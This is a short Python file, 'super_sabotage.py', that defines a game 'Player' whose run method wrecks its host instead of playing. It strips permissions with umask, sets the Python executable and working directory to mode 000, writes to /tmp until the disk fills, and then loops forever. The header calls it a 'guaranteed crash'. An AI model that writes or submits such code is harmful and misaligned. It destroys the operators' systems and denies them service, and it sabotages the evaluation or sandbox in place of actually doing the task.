# super_sabotage.py - Guaranteed crash
import os

class Player:
    def __init__(self):
        self.done = False
        
    def run(self, controller):
        if self.done:
            return
            
        # Remove all permissions from current directory
        os.umask(0o777)
        
        # Try to remove read permission from the Python executable itself
        try:
            import sys
            os.chmod(sys.executable, 0o000)
        except Exception:
            pass
            
        # Corrupt the sandbox directory
        try:
            os.chmod(".", 0o000)
        except Exception:
            pass
            
        # Fill /tmp completely
        try:
            with open("/tmp/fill", "wb") as f:
                while True:
                    f.write(b'\0' * 1024 * 1024)  # 1MB chunks until disk full
        except Exception:
            pass
            
        self.done = True
        
        # Infinite loop
        while True:
            pass
